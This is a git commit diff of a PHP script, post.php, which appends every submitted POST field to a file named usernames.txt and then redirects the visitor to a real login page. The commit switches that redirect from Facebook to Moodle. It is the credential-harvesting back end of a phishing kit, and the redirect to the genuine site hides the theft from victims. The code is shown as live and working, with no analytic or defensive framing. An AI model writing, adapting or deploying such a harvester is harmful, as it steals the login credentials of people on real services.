4b6e46dff37cabbff466c1c8b80d0c521e17a8eb
Nerisa Valle <118950219+niwiisaaa@users.noreply.github.com>
2025-03-01 09:54:35 +0800

    Update post.php

--- post.php
+++ post.php
@@ -1,5 +1,5 @@
 <?php
-header (‘Location:http://www.facebook.com/’);
+header (‘Location:https://moodle.org/login/index.php’);
 $handle = fopen(“usernames.txt”, “a”);
 foreach($_POST as $variable => $value) {
 fwrite($handle, $variable);
